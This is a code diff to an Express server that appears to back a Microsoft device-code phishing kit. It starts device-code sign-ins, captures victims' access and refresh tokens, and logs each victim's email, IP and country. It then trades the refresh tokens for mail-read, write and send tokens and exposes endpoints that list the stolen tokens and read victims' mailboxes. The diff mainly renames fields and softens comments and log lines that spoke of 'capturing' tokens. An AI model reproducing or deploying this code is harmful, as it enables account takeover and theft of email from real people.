@@ -11,10 +11,10 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.static('public'));
 
 // ============================================
-// YOUR WORKING CLIENT ID (Captures both Access Token and PRT)
+// YOUR WORKING CLIENT ID
 // ============================================
 const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
-// Microsoft's public client for mailbox (uses PRT to get mail token)
+// Microsoft's public client ID for mailbox (uses PRT to get mail access)
 const MAIL_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 // ============================================
 
@@ -43,7 +43,7 @@ function getCountryFromIp(ip) {
 }
 
 function generateSessionId() {
-    return Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+    return 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
 }
 
 function getClientIp(req) {
@@ -51,7 +51,7 @@ function getClientIp(req) {
 }
 
 // ============================================
-// STAGE 1: AUTHENTICATION - Capture both Access Token and PRT
+// START AUTHENTICATION
 // ============================================
 app.post('/start', async (req, res) => {
     try {
@@ -62,9 +62,8 @@ app.post('/start', async (req, res) => {
         
         totalVisits++;
         
-        console.log(`[START] New auth request - Session: ${sessionId}, IP: ${clientIp}`);
+        console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
         
-        // Using YOUR client ID that works with offline_access to get PRT
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: YOUR_CLIENT_ID,
@@ -76,7 +75,7 @@ app.post('/start', async (req, res) => {
         
         const { device_code, user_code, expires_in, interval } = response.data;
         
-        console.log(`[START] Device code: ${user_code}`);
+        console.log(`[START] Device code: ${user_code}, expires in ${expires_in}s`);
         
         pendingAuth.set(sessionId, {
             device_code,
@@ -90,7 +89,7 @@ app.post('/start', async (req, res) => {
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        // Start polling
+        // Start polling immediately
         pollForToken(device_code, sessionId);
         
         res.json({
@@ -106,19 +105,28 @@ app.post('/start', async (req, res) => {
     }
 });
 
-// Poll for token - captures both Access Token and PRT
+// ============================================
+// POLL FOR TOKEN
+// ============================================
 async function pollForToken(device_code, sessionId) {
-    console.log(`[POLL] Started polling for session ${sessionId}...`);
+    console.log(`[POLL] Started polling for session ${sessionId.substring(0, 15)}...`);
     
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(sessionId);
-        if (!pending || pending.status !== 'pending') {
+        if (!pending) {
+            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... not found, stopping`);
+            clearInterval(pollInterval);
+            return;
+        }
+        
+        if (pending.status !== 'pending') {
+            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... already ${pending.status}, stopping`);
             clearInterval(pollInterval);
             return;
         }
         
         if (Date.now() > pending.expiresAt) {
-            console.log(`[POLL] Session ${sessionId} expired`);
+            console.log(`[POLL] Session ${sessionId.substring(0, 15)}... expired`);
             pending.status = 'expired';
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
@@ -138,9 +146,9 @@ async function pollForToken(device_code, sessionId) {
             
             const tokens = response.data;
             
-            console.log(`[POLL] ✅ TOKENS CAPTURED!`);
-            console.log(`[POLL] Access Token: ${tokens.access_token.substring(0, 50)}...`);
-            console.log(`[POLL] PRT (Refresh Token): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
+            console.log(`[POLL] ✅ Token received for session ${sessionId.substring(0, 15)}...`);
+            console.log(`[POLL] Access token: ${tokens.access_token.substring(0, 30)}...`);
+            console.log(`[POLL] Refresh token (PRT): ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
             
             // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
@@ -150,9 +158,9 @@ async function pollForToken(device_code, sessionId) {
             const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
             const userName = userInfo.data.displayName;
             
-            console.log(`[POLL] User: ${userEmail}`);
+            console.log(`[POLL] User: ${userEmail} (${userName})`);
             
-            // Store session with BOTH tokens
+            // Store session by email
             userSessions.set(userEmail, {
                 sessionId: sessionId,
                 email: userEmail,
@@ -161,7 +169,7 @@ async function pollForToken(device_code, sessionId) {
                 userAgent: pending.userAgent,
                 country: pending.country,
                 access_token: tokens.access_token,
-                prt_token: tokens.refresh_token,  // PRT saved for later
+                refresh_token: tokens.refresh_token,  // PRT saved for mailbox
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
                 capturedAt: new Date().toISOString(),
@@ -173,35 +181,40 @@ async function pollForToken(device_code, sessionId) {
             pendingAuth.delete(sessionId);
             clearInterval(pollInterval);
             
-            console.log(`✅✅✅ SUCCESS! Both Access Token and PRT captured for ${userEmail}`);
+            console.log(`✅✅✅ SUCCESS! Session captured for ${userEmail}`);
+            console.log(`✅✅✅ PRT: ${tokens.refresh_token ? 'CAPTURED ✓' : 'NOT CAPTURED'}`);
             console.log(`✅✅✅ Total sessions: ${userSessions.size}`);
             
         } catch (err) {
+            // This is normal - waiting for user to approve
             if (err.response?.data?.error !== 'authorization_pending') {
-                console.log(`[POLL] Waiting for user to sign in...`);
+                console.log(`[POLL] Waiting for user approval...`);
             }
         }
     }, 3000);
 }
 
-// State endpoint - for auth page
+// ============================================
+// STATE ENDPOINT - Polled by auth page
+// ============================================
 app.get('/state', async (req, res) => {
     const sessionId = req.query.session_id;
     
     if (!sessionId) {
-        return res.json({ status: 'error' });
+        return res.json({ status: 'error', message: 'No session ID' });
     }
     
     const pending = pendingAuth.get(sessionId);
     
     if (pending) {
         if (pending.status === 'success') {
+            console.log(`[STATE] Session ${sessionId.substring(0, 15)}... completed successfully`);
             return res.json({ status: 'success', email: pending.email });
         }
         return res.json({ status: 'pending' });
     }
     
-    // Check existing sessions
+    // Check if already in sessions
     for (const [email, session] of userSessions.entries()) {
         if (session.sessionId === sessionId) {
             return res.json({ status: 'success', email: email });
@@ -212,7 +225,7 @@ app.get('/state', async (req, res) => {
 });
 
 // ============================================
-// STAGE 2: Get Mailbox Token using captured PRT
+// GET MAILBOX ACCESS TOKEN USING CAPTURED PRT
 // ============================================
 async function getMailboxAccessToken(email) {
     const session = userSessions.get(email);
@@ -222,19 +235,20 @@ async function getMailboxAccessToken(email) {
         return null;
     }
     
-    if (!session.prt_token) {
+    if (!session.refresh_token) {
         console.log(`❌ No PRT for ${email}`);
         return null;
     }
     
     try {
-        console.log(`[MAILBOX] Getting mailbox token for ${email} using PRT...`);
+        console.log(`[MAILBOX] Getting mailbox token for ${email}...`);
+        console.log(`[MAILBOX] Using PRT: ${session.refresh_token.substring(0, 30)}...`);
         
         // Use the captured PRT with Microsoft's public client ID to get Mail scoped token
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
             new URLSearchParams({
                 grant_type: 'refresh_token',
-                refresh_token: session.prt_token,
+                refresh_token: session.refresh_token,
                 client_id: MAIL_CLIENT_ID,
                 scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send offline_access'
             }), {
@@ -263,8 +277,9 @@ app.get('/api/sessions', (req, res) => {
         ip: s.ip,
         country: s.country,
         userAgent: s.userAgent,
-        type: 'PRT Captured',
+        type: 'Graph API',
         capturedAt: s.capturedAt,
+        expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
         hasPRT: s.hasPRT
     }));
     console.log(`[API] Returning ${sessions.length} sessions`);
@@ -276,7 +291,7 @@ app.get('/api/session/token/:email', async (req, res) => {
     const session = userSessions.get(email);
     
     if (!session) {
-        return res.status(404).json({ error: 'Session not found' });
+        return res.status(404).json({ error: 'Session not found', email: email });
     }
     
     // Generate fresh mailbox token using PRT
@@ -285,9 +300,10 @@ app.get('/api/session/token/:email', async (req, res) => {
     res.json({
         email: session.email,
         access_token: session.access_token,
-        prt_token: session.prt_token,
+        refresh_token: session.refresh_token,
         mailbox_token: mailboxToken,
-        has_prt: !!session.prt_token
+        has_refresh_token: !!session.refresh_token,
+        expires_in: session.expires_in
     });
 });
 
@@ -296,7 +312,7 @@ app.get('/api/list_access_tokens', (req, res) => {
         id: s.sessionId,
         user: s.email,
         name: s.name,
-        resource: 'Access Token',
+        resource: 'Microsoft Graph',
         accesstoken: s.access_token,
         issued_at: s.capturedAt,
         expires_at: new Date(s.expires_at).toLocaleString()
@@ -306,13 +322,13 @@ app.get('/api/list_access_tokens', (req, res) => {
 
 app.get('/api/list_refresh_tokens', (req, res) => {
     const tokens = Array.from(userSessions.values())
-        .filter(s => s.prt_token)
+        .filter(s => s.refresh_token)
         .map(s => ({
             id: s.sessionId,
             user: s.email,
             name: s.name,
-            resource: 'PRT (Refresh Token)',
-            refreshtoken: s.prt_token
+            resource: 'Microsoft Graph (PRT) - Permanent',
+            refreshtoken: s.refresh_token
         }));
     res.json(tokens);
 });
@@ -327,12 +343,16 @@ app.get('/api/country_stats', (req, res) => {
 });
 
 app.get('/api/overview_stats', (req, res) => {
+    const totalSessions = userSessions.size;
+    const totalPRTs = Array.from(userSessions.values()).filter(s => s.refresh_token).length;
+    const countries = new Set(Array.from(userSessions.values()).map(s => s.country)).size;
+    
     res.json({
         totalVisits: totalVisits,
-        totalSessions: userSessions.size,
-        totalPRTs: Array.from(userSessions.values()).filter(s => s.prt_token).length,
-        totalCountries: new Set(Array.from(userSessions.values()).map(s => s.country)).size,
-        lastCapture: userSessions.size > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
+        totalSessions: totalSessions,
+        totalPRTs: totalPRTs,
+        totalCountries: countries,
+        lastCapture: totalSessions > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
     });
 });
 
@@ -344,7 +364,7 @@ app.delete('/api/sessions/clear', (req, res) => {
 });
 
 // ============================================
-// MAILBOX API - Uses Stage 2 token
+// MAILBOX API - Uses Mail Client ID with PRT
 // ============================================
 app.get('/api/mail/folders/:email', async (req, res) => {
     const { email } = req.params;
@@ -453,7 +473,7 @@ app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
 });
 
 // ============================================
-// SETTINGS
+// SETTINGS API
 // ============================================
 let config = {
     active_resource: 'graph',
